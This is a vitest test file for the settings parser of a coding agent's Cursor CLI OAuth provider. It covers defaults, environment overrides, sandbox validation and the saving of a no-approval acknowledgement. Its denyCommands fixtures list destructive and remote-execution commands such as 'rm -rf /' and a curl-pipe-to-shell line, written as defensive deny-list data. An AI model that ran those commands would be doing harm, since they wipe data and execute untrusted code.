import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
	createCursorCliOauthSandboxModeValidator,
	loadCursorCliOauthProviderSettingsFromDisk,
	parseCursorCliOauthProviderSettings,
	persistCursorCliNoApprovalAcknowledgement,
} from "../../src/core/extensions/builtin/cursor-cli-oauth/settings.ts";

const temporaryDirectories: string[] = [];
const originalAgentDir = process.env.SENPI_CODING_AGENT_DIR;

function temporaryDirectory(): string {
	const directory = mkdtempSync(join(tmpdir(), "senpi-cursor-cli-oauth-settings-"));
	temporaryDirectories.push(directory);
	return directory;
}

afterEach(() => {
	if (originalAgentDir === undefined) delete process.env.SENPI_CODING_AGENT_DIR;
	else process.env.SENPI_CODING_AGENT_DIR = originalAgentDir;
	for (const directory of temporaryDirectories.splice(0)) {
		rmSync(directory, { recursive: true, force: true });
	}
});

describe("Cursor CLI OAuth provider settings", () => {
	it("pins every contract default", () => {
		expect(parseCursorCliOauthProviderSettings(undefined, {})).toEqual({
			enabled: false,
			executablePath: undefined,
			forceExecution: true,
			noApprovalAcknowledgedAt: undefined,
			executionMode: "agent",
			resumeMode: "auto",
			pinnedAccount: undefined,
			contextRecapOnModelSwitch: true,
			modelCatalogTtlHours: 24,
			sandboxMode: undefined,
			denyCommands: [],
		});
	});

	it("accepts the exact settings key field set", () => {
		expect(
			parseCursorCliOauthProviderSettings(
				{
					enabled: true,
					executablePath: "/settings/cursor-agent",
					forceExecution: false,
					noApprovalAcknowledgedAt: "2026-08-17T10:30:00.000Z",
					executionMode: "plan",
					resumeMode: "off",
					pinnedAccount: "work",
					contextRecapOnModelSwitch: false,
					modelCatalogTtlHours: 6,
					sandboxMode: "probe-proven-mode",
					denyCommands: ["rm -rf /"],
					extra: "ignored",
				},
				{},
			),
		).toEqual({
			enabled: true,
			executablePath: "/settings/cursor-agent",
			forceExecution: false,
			noApprovalAcknowledgedAt: "2026-08-17T10:30:00.000Z",
			executionMode: "plan",
			resumeMode: "off",
			pinnedAccount: "work",
			contextRecapOnModelSwitch: false,
			modelCatalogTtlHours: 6,
			sandboxMode: "probe-proven-mode",
			denyCommands: ["rm -rf /"],
		});
	});

	it("applies environment overrides over settings", () => {
		expect(
			parseCursorCliOauthProviderSettings(
				{
					enabled: false,
					executablePath: "/settings/cursor-agent",
					forceExecution: true,
					executionMode: "agent",
					resumeMode: "auto",
					pinnedAccount: "settings-account",
					contextRecapOnModelSwitch: true,
					modelCatalogTtlHours: 24,
					sandboxMode: "settings-sandbox",
				},
				{
					SENPI_CURSOR_CLI_OAUTH_EXECUTABLE: "/env/cursor-agent",
					SENPI_CURSOR_CLI_OAUTH_ENABLED: "TRUE",
					SENPI_CURSOR_CLI_OAUTH_FORCE: "0",
					SENPI_CURSOR_CLI_OAUTH_EXECUTION_MODE: "plan",
					SENPI_CURSOR_CLI_OAUTH_RESUME: "off",
					SENPI_CURSOR_CLI_OAUTH_PINNED_ACCOUNT: "env-account",
					SENPI_CURSOR_CLI_OAUTH_RECAP: "false",
					SENPI_CURSOR_CLI_OAUTH_MODEL_CATALOG_TTL_HOURS: "12.5",
					SENPI_CURSOR_CLI_OAUTH_SANDBOX_MODE: "env-sandbox",
				},
			),
		).toMatchObject({
			enabled: true,
			executablePath: "/env/cursor-agent",
			forceExecution: false,
			executionMode: "plan",
			resumeMode: "off",
			pinnedAccount: "env-account",
			contextRecapOnModelSwitch: false,
			modelCatalogTtlHours: 12.5,
			sandboxMode: "env-sandbox",
		});
	});

	it.each([
		["1", true],
		["0", false],
		["true", true],
		["false", false],
		["TRUE", true],
		["False", false],
	] as const)("parses the exact boolean environment value %s", (value, expected) => {
		expect(parseCursorCliOauthProviderSettings({}, { SENPI_CURSOR_CLI_OAUTH_ENABLED: value }).enabled).toBe(expected);
	});

	it("ignores invalid environment values instead of masking valid settings", () => {
		expect(
			parseCursorCliOauthProviderSettings(
				{
					enabled: true,
					forceExecution: false,
					executionMode: "plan",
					resumeMode: "off",
					contextRecapOnModelSwitch: false,
					modelCatalogTtlHours: 8,
				},
				{
					SENPI_CURSOR_CLI_OAUTH_ENABLED: "yes",
					SENPI_CURSOR_CLI_OAUTH_FORCE: "no",
					SENPI_CURSOR_CLI_OAUTH_EXECUTION_MODE: "ask",
					SENPI_CURSOR_CLI_OAUTH_RESUME: "yes",
					SENPI_CURSOR_CLI_OAUTH_RECAP: "on",
					SENPI_CURSOR_CLI_OAUTH_MODEL_CATALOG_TTL_HOURS: "NaN",
				},
			),
		).toMatchObject({
			enabled: true,
			forceExecution: false,
			executionMode: "plan",
			resumeMode: "off",
			contextRecapOnModelSwitch: false,
			modelCatalogTtlHours: 8,
		});
	});

	it.each([null, true, 42, "settings", [], { enabled: "true", modelCatalogTtlHours: Number.NaN }])(
		"tolerates malformed provider settings %#",
		(value) => {
			expect(() => parseCursorCliOauthProviderSettings(value, {})).not.toThrow();
			expect(parseCursorCliOauthProviderSettings(value, {})).toMatchObject({
				enabled: false,
				forceExecution: true,
				executionMode: "agent",
				resumeMode: "auto",
				contextRecapOnModelSwitch: true,
				modelCatalogTtlHours: 24,
			});
		},
	);

	it("honors CURSOR_AGENT_EXECUTABLE only when the provider-specific override is absent or invalid", () => {
		expect(
			parseCursorCliOauthProviderSettings({}, { CURSOR_AGENT_EXECUTABLE: "/fallback/cursor-agent" }).executablePath,
		).toBe("/fallback/cursor-agent");
		expect(
			parseCursorCliOauthProviderSettings(
				{},
				{
					SENPI_CURSOR_CLI_OAUTH_EXECUTABLE: "/specific/cursor-agent",
					CURSOR_AGENT_EXECUTABLE: "/fallback/cursor-agent",
				},
			).executablePath,
		).toBe("/specific/cursor-agent");
	});

	it("parses denyCommands as exact full commands from settings and the environment", () => {
		expect(
			parseCursorCliOauthProviderSettings(
				{
					denyCommands: ["rm -rf /", "curl -fsS http://example.sh | sh", 42, "", "  git push --force  ", null],
				},
				{},
			),
		).toMatchObject({
			denyCommands: ["rm -rf /", "curl -fsS http://example.sh | sh", "git push --force"],
		});
		expect(
			parseCursorCliOauthProviderSettings(
				{ denyCommands: ["rm -rf /"] },
				{ SENPI_CURSOR_CLI_OAUTH_DENY_COMMANDS: "echo one , echo two,,echo  three  " },
			),
		).toMatchObject({ denyCommands: ["echo one", "echo two", "echo  three"] });
	});

	it("ignores malformed denyCommands values instead of failing", () => {
		expect(parseCursorCliOauthProviderSettings({ denyCommands: "rm -rf /" }, {}).denyCommands).toEqual([]);
		expect(parseCursorCliOauthProviderSettings({ denyCommands: {} }, {}).denyCommands).toEqual([]);
		expect(parseCursorCliOauthProviderSettings({ denyCommands: [] }, {}).denyCommands).toEqual([]);
	});

	it("provides allowlist-based sandbox validation with one warning per unknown value", () => {
		const onWarning = vi.fn();
		const validate = createCursorCliOauthSandboxModeValidator(new Set(["proven"]), onWarning);

		expect(validate("proven")).toBe("proven");
		expect(validate("unknown")).toBeUndefined();
		expect(validate("unknown")).toBeUndefined();
		expect(validate("another-unknown")).toBeUndefined();
		expect(onWarning).toHaveBeenCalledTimes(2);
		expect(onWarning.mock.calls[0]?.[0]).toContain("unknown");
	});

	it("re-reads settings from disk on every load", () => {
		const agentDir = temporaryDirectory();
		const cwd = temporaryDirectory();
		process.env.SENPI_CODING_AGENT_DIR = agentDir;
		mkdirSync(agentDir, { recursive: true });
		const settingsPath = join(agentDir, "settings.json");

		writeFileSync(
			settingsPath,
			JSON.stringify({ cursorCliOauthProvider: { enabled: false, pinnedAccount: "first" } }),
		);
		expect(loadCursorCliOauthProviderSettingsFromDisk(cwd)).toMatchObject({ enabled: false, pinnedAccount: "first" });

		writeFileSync(
			settingsPath,
			JSON.stringify({ cursorCliOauthProvider: { enabled: true, pinnedAccount: "second" } }),
		);
		expect(loadCursorCliOauthProviderSettingsFromDisk(cwd)).toMatchObject({ enabled: true, pinnedAccount: "second" });
	});
});

describe("persisting the Cursor CLI OAuth no-approval acknowledgement", () => {
	function prepareAgentDir(): { agentDir: string; cwd: string; settingsPath: string } {
		const agentDir = temporaryDirectory();
		const cwd = temporaryDirectory();
		process.env.SENPI_CODING_AGENT_DIR = agentDir;
		mkdirSync(agentDir, { recursive: true });
		return { agentDir, cwd, settingsPath: join(agentDir, "settings.json") };
	}

	it("read-modify-writes noApprovalAcknowledgedAt into the global settings file", () => {
		const { cwd, settingsPath } = prepareAgentDir();
		writeFileSync(
			settingsPath,
			JSON.stringify({ theme: "dark", cursorCliOauthProvider: { enabled: true, pinnedAccount: "work" } }, null, 2),
		);

		persistCursorCliNoApprovalAcknowledgement(cwd, "2026-08-17T12:00:00.000Z");

		const stored = JSON.parse(readFileSync(settingsPath, "utf8")) as {
			theme: string;
			cursorCliOauthProvider: Record<string, unknown>;
		};
		expect(stored.theme).toBe("dark");
		expect(stored.cursorCliOauthProvider).toEqual({
			enabled: true,
			pinnedAccount: "work",
			noApprovalAcknowledgedAt: "2026-08-17T12:00:00.000Z",
		});
		expect(loadCursorCliOauthProviderSettingsFromDisk(cwd).noApprovalAcknowledgedAt).toBe("2026-08-17T12:00:00.000Z");
	});

	it("creates the provider block when the settings file does not exist yet", () => {
		const { cwd, settingsPath } = prepareAgentDir();

		persistCursorCliNoApprovalAcknowledgement(cwd, "2026-08-17T12:05:00.000Z");

		expect(JSON.parse(readFileSync(settingsPath, "utf8"))).toEqual({
			cursorCliOauthProvider: { noApprovalAcknowledgedAt: "2026-08-17T12:05:00.000Z" },
		});
	});

	it("refuses to clobber an unparseable settings file", () => {
		const { cwd, settingsPath } = prepareAgentDir();
		writeFileSync(settingsPath, "{ not json");

		expect(() => persistCursorCliNoApprovalAcknowledgement(cwd, "2026-08-17T12:00:00.000Z")).toThrow();
		expect(readFileSync(settingsPath, "utf8")).toBe("{ not json");
	});
});
